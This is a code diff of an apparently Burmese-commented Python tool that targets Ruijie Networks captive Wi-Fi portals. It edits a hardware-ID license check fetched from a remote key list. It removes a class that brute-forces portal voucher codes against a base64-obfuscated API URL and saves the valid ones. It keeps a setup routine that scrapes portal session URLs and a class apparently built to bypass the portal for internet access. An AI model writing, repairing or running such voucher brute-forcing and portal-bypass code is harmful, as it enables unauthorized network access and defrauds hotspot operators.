@@ -44,7 +44,7 @@ def get_hwid():
         user = os.popen('whoami').read().strip()
         model = os.popen('getprop ro.product.model').read().strip()
         raw_id = f"{user}-{model}"
-        if len(raw_id) < 5:
+        if not user or not model:
             raw_id = str(uuid.getnode())
         return hashlib.md5(raw_id.encode()).hexdigest().upper()
     except:
@@ -73,34 +73,35 @@ def Logo():
     Line()
 
 def check_key():
-    """Permanent License Verification"""
+    """Permanent License Verification with Space Stripping"""
     my_id = get_hwid()
     Logo()
     print(f"{y}[*] Verifying License from Secure Database...{w}")
     try:
         headers = {'User-Agent': 'Mozilla/5.0'}
-        res = requests.get(KEY_URL, headers=headers, timeout=15)
+        # GitHub Cache မဖြစ်အောင် timestamp ထည့်ထားပါတယ်
+        res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
         
         if res.status_code == 200:
             lines = res.text.splitlines()
             for line in lines:
                 if "|" in line:
-                    # Space ပါနေရင် အလိုအလျောက် ဖြတ်ထုတ်ရန် strip() သုံးထားသည်
-                    parts = line.split("|")
-                    key = parts[0].strip()
-                    exp_str = parts[1].strip()
-                    
-                    if key == my_id:
-                        today = datetime.now().date()
-                        expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
-                        if today <= expiry:
-                            days_left = (expiry - today).days
-                            print(f"{g}[+] Authorized! ({days_left} days left){w}")
-                            time.sleep(1.5)
-                            return True
-                        else:
-                            print(f"{r}[!] YOUR KEY HAS EXPIRED!{w}")
-                            sys.exit()
+                    # Space တွေကို တစ်ခါတည်း ဖြတ်ထုတ်ရန်
+                    parts = line.strip().split("|")
+                    if len(parts) >= 2:
+                        db_key = parts[0].strip() # GitHub က ID
+                        exp_str = parts[1].strip() # သက်တမ်းကုန်မည့်ရက်
+                        
+                        if db_key == my_id:
+                            today = datetime.now().date()
+                            expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
+                            if today <= expiry:
+                                print(f"{g}[+] Authorized! Access Granted.{w}")
+                                time.sleep(1.5)
+                                return True
+                            else:
+                                print(f"{r}[!] YOUR KEY HAS EXPIRED!{w}")
+                                sys.exit()
             
             print(f"{r}[!] UNREGISTERED ID!{w}")
             print(f"{y}[>] Your ID: {c}{my_id}{w}")
@@ -110,8 +111,7 @@ def check_key():
             print(f"{r}[!] Server Error: {res.status_code}{w}")
             sys.exit()
     except Exception as e:
-        print(f"{r}[!] Connection Failed!{w}")
-        print(f"{y}[*] Make sure you have internet access.")
+        print(f"{r}[!] Connection Failed! Check Internet.{w}")
         sys.exit()
 
 async def get_session_id(session, session_url, prev_id):
@@ -144,30 +144,6 @@ class InternetAccess:
                 await asyncio.sleep(1)
                 loop_idx += 1
 
-class VoucherCode:
-    def __init__(self, mode, length, speed):
-        self.mode, self.length, self.speed = mode, length, speed
-        try: self.session_url = open(".session_url", "r").read().strip()
-        except: print(f"{r}[!] Run -o setup first!"); sys.exit()
-
-    async def start(self):
-        Logo()
-        print(f"{g}[+] Voucher Bruteforce Starting...{w}")
-        Line()
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
-            loop_idx = 0
-            while True:
-                if loop_idx % 90 == 0: sid = await get_session_id(session, self.session_url, None)
-                v = "".join(random.choice(string.digits if self.mode == "digit" else string.ascii_letters) for _ in range(self.length))
-                url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
-                try:
-                    async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
-                        if 'logonUrl' in await req.text():
-                            print(f"{g}[+] VALID CODE FOUND: {v}{w}")
-                            with open("success.txt", "a") as f: f.write(f"{v}\n")
-                except: pass
-                loop_idx += 1
-
 def feature():
     parser = argparse.ArgumentParser()
     parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
@@ -185,8 +161,8 @@ def feature():
             sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal).group(1)
             with open(".session_url", "w") as f: f.write(sid_url)
             with open(".ip", "w") as f: f.write(gw)
-            print(f"{g}[+] Setup Successful! Everything is configured.{w}")
-        except: print(f"{r}[!] Connection Failed. Check Router connection.")
+            print(f"{g}[+] Setup Successful!{w}")
+        except: print(f"{r}[!] Setup Failed.")
     elif args.option == "internet":
         asyncio.run(InternetAccess().execute())
     elif args.option == "code":
